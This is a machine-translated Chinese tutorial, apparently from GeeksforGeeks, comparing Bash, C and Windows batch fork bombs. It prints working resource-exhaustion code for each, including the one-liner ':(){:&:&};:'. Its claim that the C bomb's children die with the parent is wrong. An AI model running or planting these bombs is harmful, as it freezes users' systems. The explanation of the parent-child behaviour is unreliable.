# C 对 BASH 叉弹

> 原文:[https://www . geesforgeks . org/c-vs-bash-fork-bomb-difference-modifications/](https://www.geeksforgeeks.org/c-vs-bash-fork-bomb-difference-modifications/)

先决条件:

*   [分叉系统调用](https://www.geeksforgeeks.org/fork-system-call/)
*   [叉弹](https://www.geeksforgeeks.org/fork-bomb/)

**重击叉弹:**

```cpp
:(){:&:&};:

```

**在 Unix 中工作:**
在类似 Unix 的操作系统中，分叉炸弹一般都是用分叉系统调用编写的。由于分叉进程也是第一个程序的副本，一旦它们从帧指针处的下一个地址恢复执行，它们也会试图创建自己的副本。这具有导致过程指数增长的效果。

**叉弹的 C 程序:**

```cpp
// Modified fork bomb
#include <unistd.h>
#include <malloc.h>

int main()
{
    //Infinite loop
    while (1)
    {
        // Generating child fork processes
        fork();
    }
}
```

**在 Windows 中工作:**
微软 Windows 操作系统没有与 Unix 分叉系统调用等效的功能。因此，这种操作系统上的分叉炸弹必须创建一个新的进程，而不是从现有的进程分叉。

【Bash 和 C 叉()炸弹哪个威力更大

很明显，BASH 分叉炸弹比它的 C 程序版本强大得多。原因是在 BASH 中，我们创建的进程与父进程是分离的。如果父进程(我们最初启动的那个)被终止，其余的进程将继续运行。但是在 C 实现中，如果父进程被杀死，列出的子进程就会死去，所以这足以让我们开始的初始进程倒下，让整个不断分叉的进程倒下。脚本直接与系统通信。

C 中的叉弹程序可以修改。我们可以在创建分叉进程时在程序中分配内存。
下面是改装 C 叉弹的实现:

```cpp
// Modified fork bomb
#include <unistd.h>
#include <malloc.h>

int main()
{
    // Infinite loop
    while (1)
    {
        // Generating child fork processes
        fork();

        // Allocating memory in RAM
        int *p = (int *) malloc (sizeof (int) * 100000);
    }
}
```

**窗口不同叉弹:**

*   Terminal script :

    ```cpp
    %0|%0
    ```

    将其保存为 bat 扩展(示例 fork.bat)。
    每一个符号的过程都与 BASH 脚本有些相似。给定的行将再次调用同一个文件，并将输出传送到同一个批处理文件的另一个实例。使系统崩溃还不够致命。但它肯定会使中央处理器反应迟钝，足以让重启成为唯一的选择。

*   Batch file :

    ```cpp
    :runthis
    start %0
    goto runthis

    ```

    将其保存为 bat 扩展(示例 fork.bat)。
    工作:

    ```cpp
    :runthis is a label which determines a point 
    where the execution can be sent using the goto command.

    start %0 asks the command prompt to launch 
    another instance of the same batch file into another process.

    goto runthis command tells the execution to 
    go to the runthis label which will then call the start %0 command.

    ```

    它将进入一个自递归调用，并最终创建许多进程。
    系统会因为资源过度使用而挂起！许多命令提示符窗口将会打开，整个系统将在几秒钟内停止运行。

本文由 **[罗希特·塔普利亚尔](https://www.linkedin.com/in/rohit-thapliyal-515b5913a/)** 供稿。如果你喜欢 GeeksforGeeks 并想投稿，你也可以使用[contribute.geeksforgeeks.org](http://www.contribute.geeksforgeeks.org)写一篇文章或者把你的文章邮寄到 contribute@geeksforgeeks.org。看到你的文章出现在极客博客主页上，帮助其他极客。

如果你发现任何不正确的地方，或者你想分享更多关于上面讨论的话题的信息，请写评论。